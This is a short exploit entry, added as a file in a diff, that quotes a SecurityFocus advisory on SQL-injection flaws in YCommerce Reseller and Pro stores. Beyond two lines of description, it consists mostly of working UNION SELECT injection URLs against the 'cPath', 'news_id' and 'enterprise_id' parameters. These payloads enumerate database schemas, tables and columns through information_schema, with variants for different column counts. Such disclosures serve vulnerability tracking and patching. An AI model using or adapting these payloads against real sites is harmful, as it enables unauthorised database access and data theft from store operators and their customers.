@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/55653/info
+
+YCommerce is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database. 
+
+Proof of Concept - YCommerce Reseller
+-------------------------------------
+GET Param "cPath" - [Number of columns may vary]
+/store/index.php?cPath=1 union all select 1,concat_ws(0x3a,table_schema,table_name,column_name),3,4,5 from information_schema.columns where table_schema!=0x696E666F726D6174696F6E5F736368656D61--
+/store/index.php?cPath=1 union all select 1,concat_ws(0x3a,table_schema,table_name,column_name),3,4,5,6,7 from information_schema.columns where table_schema!=0x696E666F726D6174696F6E5F736368656D61--
+/store/index.php?cPath=1 union all select 1,concat_ws(0x3a,table_schema,table_name,column_name),3,4,5,6,7,8,9 from information_schema.columns where table_schema!=0x696E666F726D6174696F6E5F736368656D61--
+
+GET Param "news_id" - [Number of columns may vary]
+/store/index.php?pag=news&news_id=-1 union all select 1,concat_ws(0x3a,table_schema,table_name,column_name),3,4,5,6,7,8 from information_schema.columns where table_schema!=0x696E666F726D6174696F6E5F736368656D61--
+
+
+Proof of Concept - YCommerce Pro
+--------------------------------
+GET Param "enterprise_id" - [Number of columns may vary]
+/store/default.php?enterprise_id=-1 union all select 1,2,concat_ws(0x3a,table_schema,table_name,column_name),4,5,6,7 from information_schema.columns where table_schema!=0x696E666F726D6174696F6E5F736368656D61
+
+GET Param "news_id" - [Number of columns may vary]
+/store/index.php?pag=news&news_id=-1 union all select 1,concat_ws(0x3a,table_schema,table_name,column_name),3,4,5,6,7,8 from information_schema.columns where table_schema!=0x696E666F726D6174696F6E5F736368656D61--
+
+
